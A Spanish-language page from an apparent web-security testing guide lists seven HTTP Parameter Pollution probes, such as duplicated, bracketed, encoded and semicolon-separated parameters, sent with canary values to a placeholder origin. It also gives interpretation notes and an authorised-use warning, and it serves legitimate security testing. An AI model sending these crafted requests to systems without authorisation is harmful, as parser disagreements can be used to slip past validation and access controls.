# 🗡️ HTTP Parameter Pollution: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Duplicado A-B

**Objetivo:** Identificar si el backend elige primer, último o lista.

```http
GET /api/search?q=canary-A&q=canary-B HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Comparar con A y B por separado; la precedencia es propiedad del parser, no hallazgo por sí sola.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).

### 2. Duplicado B-A

**Objetivo:** Confirmar que el orden cambia la selección.

```http
GET /api/search?q=canary-B&q=canary-A HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Si ambos resultados cambian de manera consistente, registrar la semántica antes de buscar un control de seguridad.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).

### 3. Query frente a body

**Objetivo:** Detectar prioridad de fuentes.

```http
POST /api/search?q=canary-A HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

q=canary-B
```

**Interpretación:** Una capa puede validar query y otra usar body; confirmar cuál llega al sink.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).

### 4. Formato array con corchetes

**Objetivo:** Probar cómo el framework normaliza claves.

```http
GET /api/search?q[]=canary-A&q[]=canary-B HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Puede resultar lista, error o clave literal; no asumir comportamiento de PHP/Express sin evidencia.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).

### 5. Notación índice

**Objetivo:** Distinguir una lista ordenada de parámetros repetidos.

```http
GET /api/search?q[0]=canary-A&q[1]=canary-B HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Registrar objeto realmente interpretado y compararlo con la política aplicada.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).

### 6. Query repetida con codificación

**Objetivo:** Comprobar si una capa decodifica el nombre antes que otra.

```http
GET /api/search?q=canary-A&%71=canary-B HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** `%71` es `q`; un desacuerdo de parsers solo importa si el validador y el sink usan valores distintos.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).

### 7. Separador punto y coma

**Objetivo:** Detectar divergencia de parseo histórica.

```http
GET /api/search?q=canary-A;q=canary-B HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Muchos parsers modernos tratan `;` como dato; verificar ambos lados sin asumir bypass.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
